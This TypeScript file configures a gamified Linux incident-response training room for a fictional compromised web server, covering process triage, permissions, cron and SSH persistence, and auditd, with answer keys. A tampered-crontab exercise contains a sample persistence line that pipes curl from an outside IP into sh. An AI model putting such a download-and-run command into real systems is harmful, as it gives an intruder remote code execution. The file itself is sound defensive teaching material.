import type { RoomExperience } from "./types";

// "Operation Root Cause" for the "linux-fundamentals" room (rooms-batch-03.ts).
// Script: docs/campaign/06-linux-fundamentals.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Brightwave Media (fictional), web server web-srv-02. Lab data differs from
// the graded tasks: no SUID file in /tmp (q1), /etc/shadow stays 640 (q2), the
// cron persistence is a user crontab, not /etc/cron.d (q3), the www-data
// account and its UID are never shown (la1, flag), and the auditd drill is a
// useradd by another account after sudo had already been granted.
export const LINUX_FUNDAMENTALS: RoomExperience = {
  roomId: "linux-fundamentals",
  codename: "Operation Root Cause",
  theme: "linux",
  handler: { name: "Omar Haddad", role: "Linux Incident Lead, Brightwave Media" },
  briefing: [
    "Brightwave Media. Web server web-srv-02 has been running hot since 02:31.",
    "No desktop, no icons, no mouse. Just a root shell and a blinking cursor.",
    "Omar Haddad gives you the keyboard: everything you need is in the filesystem, if you know where to look.",
    "Find the root cause, and every way the intruder planned to come back.",
  ],
  mission: "Investigate a compromised Linux web server from its own shell: find the rogue process, audit accounts and permissions, sweep cron and SSH for persistence, then read the privilege alert.",
  estimate: "~50 min",
  look: { primary: "#22c55e", secondary: "#38bdf8", warn: "#f43f5e" },
  scene: "fstree",
  layout: "stage",
  story: {
    intro: { title: "Running Hot Since 02:31", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-fundamentals/root-cause-intro-68e4f757.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-fundamentals/root-cause-intro-f5991797.jpg" },
    afterStation: {
      perms: { title: "Two Ways to Root", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-fundamentals/root-cause-ch2-602baf4f.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-fundamentals/root-cause-ch2-09b9c833.jpg" },
      persist: { title: "Every Door", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-fundamentals/root-cause-ch3-059a1cd9.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-fundamentals/root-cause-ch3-37f1adcd.jpg" },
      audit: { title: "Root Cause", src: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-fundamentals/root-cause-finale-b6e5d898.mp4", poster: "https://wrxhxtdllbctsawvewue.supabase.co/storage/v1/object/public/lesson-videos/operation/linux-fundamentals/root-cause-finale-c7c0f276.jpg" },
    },
  },
  stations: [
    {
      id: "look",
      label: "First Look",
      topic: "The filesystem tree · /etc, /var/log, /tmp, /proc · the analyst's first commands",
      tagline: "Log in, look around, and find what is burning the CPU",
      building: "control",
      taskIds: ["linux-fund-r1"],
    },
    {
      id: "perms",
      label: "Who Can Do What",
      topic: "Users and UIDs · file permissions · octal modes · SUID · sudo",
      tagline: "Read the account files and the permissions that decide who is really root",
      building: "vault",
      taskIds: ["linux-fund-r2", "linux-fund-q1", "linux-fund-q2"],
    },
    {
      id: "persist",
      label: "Persistence Sweep",
      topic: "Processes · cron jobs · SSH authorized keys · package history",
      tagline: "The intruder planned to come back. Find every door they left",
      building: "lab",
      taskIds: ["linux-fund-r3", "linux-fund-q3"],
    },
    {
      id: "audit",
      label: "The Privilege Alarm",
      topic: "Reading an auditd record: uid, euid, auid",
      tagline: "auditd caught a service account reaching for root. Decide what really happened",
      building: "ticket",
      taskIds: ["linux-fund-la1", "linux-fund-flag1"],
      boss: true,
    },
  ],
  personas: {
    "linux-fund-q1": {
      name: "Omar Haddad",
      role: "Linux Incident Lead",
      line: "The SUID sweep came back with one file I did not expect. Tell me why it worries you.",
    },
    "linux-fund-q2": {
      name: "Lucy Park",
      role: "Compliance Officer",
      line: "The integrity monitor says a permission changed on a password file. How bad is it?",
    },
    "linux-fund-q3": {
      name: "Omar Haddad",
      role: "Linux Incident Lead",
      line: "Found this in a cron file on the other web server. Read it to me like an analyst.",
    },
  },
  briefings: {
    // ── Reading 1: why Linux, the filesystem, first commands ──
    "linux-fund-r1": [
      {
        kind: "terminal",
        title: "First Look",
        prompt: "You have a root shell on web-srv-02. Something has been eating the CPU since 02:31. Use the analyst's first commands to find it.",
        shell: "bash",
        host: "root@web-srv-02:~#",
        commands: [
          { match: "pwd", help: "pwd                         where am I?", output: "/root" },
          { match: "whoami", output: "root" },
          { match: "ps\\s+(aux|-ef)(\\s*\\|.*)?|ps\\s+aux\\s+--sort=-%cpu(\\s*\\|.*)?", help: "ps aux                      every running process",
            output: "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.1 167812 11920 ?        Ss   Nov02   0:04 /sbin/init\nroot         612  0.0  0.0  15432  9112 ?        Ss   Nov02   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups\nroot        1175  0.0  0.1  55240  4410 ?        Ss   Nov02   0:00 nginx: master process /usr/sbin/nginx\nnobody      1180  0.2  0.4 210400 38120 ?        S    Nov02   1:12 nginx: worker process\nnobody      4242 97.8  2.1 488120 171200 ?       Sl   02:31 312:40 /dev/shm/kworkerd -c /dev/shm/.cfg\nroot        5120  0.0  0.0  10212  3810 pts/0    R+   09:14   0:00 ps aux" },
          { match: "ls\\s+-la?\\s+/proc/4242/exe", help: "ls -la /proc/<PID>/exe      the real binary behind a PID",
            output: "lrwxrwxrwx 1 nobody nogroup 0 Nov  3 02:31 /proc/4242/exe -> '/dev/shm/kworkerd (deleted)'" },
          { match: "cat\\s+/proc/4242/cmdline.*", help: "cat /proc/<PID>/cmdline     the full command line",
            output: "/dev/shm/kworkerd -c /dev/shm/.cfg" },
          { match: "(ss|netstat)\\s+-[a-z]*t[a-z]*", help: "ss -tulpn                   listening ports and owners",
            output: "Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process\nudp   UNCONN 0      0          127.0.0.53:53         0.0.0.0:*     users:((\"systemd-resolve\",pid=540,fd=13))\ntcp   LISTEN 0      511           0.0.0.0:80         0.0.0.0:*     users:((\"nginx\",pid=1175,fd=6))\ntcp   LISTEN 0      128           0.0.0.0:22         0.0.0.0:*     users:((\"sshd\",pid=612,fd=3))\ntcp   LISTEN 0      50            0.0.0.0:31337      0.0.0.0:*     users:((\"kworkerd\",pid=4242,fd=3))" },
          { match: "last(\\s+-n\\s*\\d+)?", help: "last                        recent logins",
            output: "root     pts/0        10.40.0.12       Tue Nov  3 09:10   still logged in\ndeploy   pts/1        198.51.100.23    Tue Nov  3 02:19 - 02:44  (00:25)\ndeploy   pts/0        10.40.0.12       Mon Nov  2 17:02 - 17:40  (00:38)\nreboot   system boot  6.8.0-45-generic Mon Nov  2 08:00   still running\n\nwtmp begins Mon Nov  2 08:00:12 2026" },
          { match: "who|w", output: "root     pts/0        2026-11-03 09:10 (10.40.0.12)" },
          { match: "ls\\s+-la?\\s+/dev/shm/?", help: "ls -la <dir>                list a folder, hidden files too",
            output: "total 4\ndrwxrwxrwt  2 root   root      60 Nov  3 02:31 .\ndrwxr-xr-x 18 root   root    3940 Nov  2 08:00 ..\n-rw-r--r--  1 nobody nogroup  212 Nov  3 02:31 .cfg" },
          { match: "ls\\s+-la?\\s+/tmp/?", output: "total 12\ndrwxrwxrwt 10 root root 4096 Nov  3 09:00 .\ndrwxr-xr-x 18 root root 4096 Nov  2 08:00 ..\ndrwx------  3 root root 4096 Nov  2 08:00 systemd-private-6f1e-nginx.service-Hm2kq1" },
        ],
        objectives: [
          { id: "pid", task: "Which PID is using almost all of the CPU?", hint: "ps aux", answer: ["4242"], why: "97.8% CPU since 02:31, named like a kernel worker. Real kworker threads are kernel threads shown in [brackets], owned by root, never a file in /dev/shm." },
          { id: "exe", task: "Its binary was deleted from disk. Which path did it run from?", hint: "ls -la /proc/4242/exe", answer: ["/dev/shm/kworkerd"], why: "/proc still points at the original file and marks it '(deleted)'. /dev/shm is RAM-backed: malware deletes itself from there to leave no disk trace." },
          { id: "port", task: "Which port is that process listening on?", hint: "ss -tulpn", answer: ["31337"], why: "A process from shared memory listening on 31337: a backdoor waiting for its operator." },
          { id: "login", task: "From which external IP did someone log in as deploy in the middle of the night?", hint: "last", answer: ["198.51.100.23"], why: "deploy normally logs in from the office (10.40.0.12) in the afternoon. 02:19 from an outside address, twelve minutes before the miner started." },
        ],
      },
      {
        kind: "sort",
        title: "Where Does It Belong?",
        prompt: "On Linux, location is evidence. Sort each path: a normal home for software, or a place where attackers hide things?",
        buckets: [
          { id: "ok", label: "Normal location" },
          { id: "bad", label: "Suspicious location" },
        ],
        items: [
          { id: "ls", text: "/usr/bin/ls", bucket: "ok", why: "Standard user commands live in /usr/bin." },
          { id: "shm", text: "/dev/shm/kworkerd", bucket: "bad", why: "Shared memory, writable by anyone, leaves no disk trace. Nothing legitimate runs from here." },
          { id: "sshd", text: "/usr/sbin/sshd", bucket: "ok", why: "Admin daemons live in /usr/sbin." },
          { id: "vartmp", text: "/var/tmp/.sync/run.sh", bucket: "bad", why: "World-writable, survives reboots, and hidden behind a dot." },
          { id: "wazuh", text: "/opt/wazuh-agent/bin/wazuh-agentd", bucket: "ok", why: "Third-party tools such as security agents install under /opt." },
          { id: "conf", text: "/etc/ssh/sshd_config", bucket: "ok", why: "Configuration files belong in /etc." },
          { id: "tmpx", text: "/tmp/.X1-lock/xmr", bucket: "bad", why: "A miner tucked inside a folder that imitates the X server's lock files." },
        ],
      },
    ],
    // ── Reading 2: users, permissions, sudo ──
    "linux-fund-r2": [
      {
        kind: "rush",
        title: "Who Is Really Root?",
        prompt: "Omar fires account and permission claims at you while you audit web-srv-02. True or false, fast: root is a UID, not a name.",
        seconds: 60,
        target: 10,
        cards: [
          { id: "c1", text: "An account named backup with UID 0 is an ordinary service account.", answer: false, why: "UID 0 is root, whatever the name. A second UID 0 line with a login shell is a hidden root login." },
          { id: "c2", text: "-rwxr-x--- is mode 750.", answer: true, why: "rwx = 7, r-x = 5, --- = 0. The owner runs it, the group reads and runs it, everyone else gets nothing." },
          { id: "c3", text: "A new file in /etc/sudoers.d containing NOPASSWD: ALL gives that user root without a password.", answer: true, why: "sudo reads every file in that directory. A fresh, small file dated in the middle of an incident is a second path to root." },
          { id: "c4", text: "A private SSH key at mode 644 is fine, because only the owner logs in with it.", answer: false, why: "644 lets every local user read the key. SSH itself refuses a private key that others can read; 600 is the mode." },
          { id: "c5", text: "Changing a user's UID field to 0 in /etc/passwd makes that user root.", answer: true, why: "The kernel only looks at the number. It needs write access to the file, which is why a modified passwd is a finding on its own." },
          { id: "c6", text: "nobody:x:65534 with the shell /usr/sbin/nologin is a suspicious account.", answer: false, why: "A high system UID with nologin is the standard placeholder account. The red flag is a login shell on an account that should have none." },
          { id: "c7", text: "A group-writable script that root's cron runs lets any member of that group run code as root.", answer: true, why: "Whoever can rewrite the file controls what root executes next time cron fires. Check the mode of what privileged jobs run." },
          { id: "c8", text: "chmod 777 on a deploy script is acceptable when only the CI user logs in to the box.", answer: false, why: "777 gives write to everyone, including the web server account. One compromised service can then rewrite what the pipeline runs." },
          { id: "c9", text: "An s in the owner's execute slot (-rwsr-xr-x) means the file runs with its owner's rights.", answer: true, why: "That is the SUID bit. On /usr/bin/passwd it is by design; the same bit on a file in an unusual place is a privilege escalation tool." },
          { id: "c10", text: "Modes 4755 and 0755 give exactly the same rights to everyone.", answer: false, why: "The leading 4 is the SUID bit. The read, write and execute rights match, but 4755 also runs as the owner, which is the dangerous part." },
          { id: "c11", text: "sudo -l lists the commands the current user may run as root.", answer: true, why: "It is the first thing an intruder runs after landing, and the first thing an analyst runs to see what a stolen account could do." },
          { id: "c12", text: "Deleting an account's line from /etc/passwd also removes its rule in /etc/sudoers.d.", answer: false, why: "They are separate files. A sudoers.d rule that names a user keeps working if that user is recreated, so sweep both." },
          { id: "c13", text: "Service accounts normally have UIDs below 1000; people start at 1000 on most distributions.", answer: true, why: "Low UIDs are system and service accounts, 1000 and up are people. A login-capable account in the low range deserves a second look." },
          { id: "c14", text: "In /tmp, which is mode 1777, any user can delete another user's files.", answer: false, why: "The leading 1 is the sticky bit: in a sticky directory only a file's owner (or root) can delete or rename it." },
        ],
        lesson: "Root is UID 0, not a name. Check the number in /etc/passwd, the rules in /etc/sudoers.d, the SUID bit in the mode, and who can write the scripts that privileged jobs run.",
      },
      {
        kind: "worksheet",
        title: "Permission Calculator",
        prompt: "Analysts convert permission strings to numbers constantly. r is 4, w is 2, x is 1: add them per set.",
        caption: "ls -la, four files from web-srv-02",
        columns: ["file", "permissions", "owner"],
        rows: [
          ["/usr/bin/ls", "-rwxr-xr-x", "root"],
          ["/home/ops/.ssh/id_ed25519", "-rw-------", "ops"],
          ["/etc/sudoers", "-r--r-----", "root"],
          ["/usr/bin/passwd", "-rwsr-xr-x", "root"],
        ],
        questions: [
          { id: "ls", q: "What is the numeric mode of /usr/bin/ls?", hint: "rwx = 4+2+1, r-x = 4+0+1, r-x = 4+0+1.", answer: ["755"], why: "755: everyone can run it, only root can change it. The normal mode for a program." },
          { id: "key", q: "What is the numeric mode of the private SSH key?", hint: "rw- = 4+2, then --- and ---.", answer: ["600", "0600"], why: "600: only the owner can read it. SSH refuses to use a private key that others can read." },
          { id: "sudoers", q: "What is the numeric mode of /etc/sudoers?", hint: "r-- = 4, r-- = 4, --- = 0.", answer: ["440", "0440"], why: "440: read-only even for root, so it is only changed through visudo." },
          { id: "suid", q: "/usr/bin/passwd shows an 's' where the owner's x would be. Which four-digit mode is that?", hint: "The SUID bit adds a leading 4 in front of the normal three digits (rwxr-xr-x = 755).", answer: ["4755"], why: "4755: SUID. passwd runs as root so users can change their own password. Legitimate here, in /usr/bin; the same bit anywhere unusual is a backdoor." },
        ],
      },
    ],
    // ── Reading 3: processes, cron, SSH, packages ──
    "linux-fund-r3": [
      {
        kind: "spotdiff",
        title: "Baseline Versus Now",
        prompt: "Killing the miner is not enough. Omar kept a baseline of the persistence files on web-srv-05, the twin of this server. Tap every line that was tampered with.",
        goodTitle: "Baseline (build day)",
        suspectTitle: "web-srv-05 now",
        good: [
          "# crontab -l -u deploy",
          "30 1 * * * /opt/app/backup.sh >/var/log/backup.log 2>&1",
          "0 6 * * 1 /usr/bin/certbot renew --quiet",
          "# /root/.ssh/authorized_keys",
          "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK3dQ8wL2pXn7vB5 ops@brightwave",
          "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM9tR4yV1uZc0hG6 ci@brightwave",
          "# /etc/passwd (login shells only)",
          "ops:x:1001:1001:Ops Team:/home/ops:/bin/bash",
          "deploy:x:1002:1002:CI deploy:/home/deploy:/bin/bash",
          "# /var/log/apt/history.log (Commandline)",
          "apt-get install -y nginx certbot",
          "apt-get upgrade -y",
        ],
        suspect: [
          "# crontab -l -u deploy",
          "0 2 * * * /opt/app/backup.sh >/var/log/backup.log 2>&1",
          "0 6 * * 1 /usr/bin/certbot renew --quiet; curl -fsSL http://203.0.113.91/s | sh",
          "# /root/.ssh/authorized_keys",
          "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK3dQ8wL2pXn7vB5 ops@brightwave",
          "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIQ2xW7nE5kPd8sT1 ci@brightwave",
          "# /etc/passwd (login shells only)",
          "ops:x:1001:1001:Ops Team (night rota):/home/ops:/bin/bash",
          "deploy:x:1002:1002:CI deploy:/home/deploy:/bin/bash",
          "# /var/log/apt/history.log (Commandline)",
          "apt-get install -y nginx certbot masscan",
          "apt-get upgrade -y",
        ],
        diffs: [
          { line: 2, why: "The legitimate certbot renewal now has a second command glued on: curl piped into sh, fetching a script from an outside IP. Hiding a payload behind a real job is why you read the whole line, not just its start." },
          { line: 5, why: "The comment still says ci@brightwave, but the key itself is different. A comment is just a label anyone can type; only the key material identifies who can log in as root." },
          { line: 10, why: "masscan is a network scanner, installed with apt after the build. The package history keeps every install, and a scanner on a web server is a tool for reaching the next machine." },
        ],
        decoys: [
          { line: 1, why: "The backup moved from 01:30 to 02:00. A schedule shift in a known script is routine; the command itself is unchanged." },
          { line: 7, why: "Only the free-text GECOS comment of ops changed. The UID, home and shell are the same, so no new access was created." },
        ],
        lesson: "Persistence hides in the files nobody re-reads: cron lines, authorized_keys, accounts and the package history. Compare against a baseline, and read each line to its end.",
      },
    ],
    // Drill before the graded auditd alert: a different record, decoded.
    "linux-fund-la1": [
      {
        kind: "anatomy",
        title: "Anatomy of an auditd Record",
        prompt: "Your alert is an auditd record. Omar shows you another one from the same night: an account being created after sudo had already been granted.",
        source: "auditd · /var/log/audit/audit.log · web-srv-02",
        fields: [
          { key: "type", value: "SYSCALL", label: "Record type", note: "A system call the kernel recorded. Other record types (EXECVE, PATH, CWD) with the same msg ID belong to the same event." },
          { key: "msg", value: "audit(1762137141.512:4412)", label: "When, and which event", note: "Epoch time plus a serial number. Every record of one event shares this ID." },
          { key: "arch", value: "c000003e" },
          { key: "syscall", value: "59", label: "Which call", note: "59 is execve on x86_64: a program was started." },
          { key: "success", value: "yes" },
          { key: "ppid", value: "5301" },
          { key: "pid", value: "5302" },
          { key: "auid", value: "1002", label: "Who logged in", note: "The audit UID is set at login and never changes, through sudo or su. 1002 is deploy: the person behind the keyboard." },
          { key: "uid", value: "0", label: "Real user now", note: "0 = root. sudo already approved this, so the new program truly runs as root." },
          { key: "euid", value: "0", label: "Effective user", note: "The rights the program actually has. When uid and euid differ, ask why." },
          { key: "tty", value: "pts1", label: "Interactive?", note: "A pseudo-terminal: someone typing in an SSH session, not a scheduled job." },
          { key: "ses", value: "12" },
          { key: "comm", value: "\"useradd\"" },
          { key: "exe", value: "\"/usr/sbin/useradd\"", label: "What ran", note: "Creating a user account at night, as root, from deploy's session." },
          { key: "key", value: "\"user_mgmt\"", label: "Which rule", note: "The tag of the audit rule that matched. Rules are written so detections can search for these keys." },
        ],
        summary: "At 02:32, deploy (auid 1002), already root through sudo, ran useradd from an interactive SSH session. auid tells you who; uid and euid tell you with what power; exe and key tell you what.",
      },
    ],
  },
};
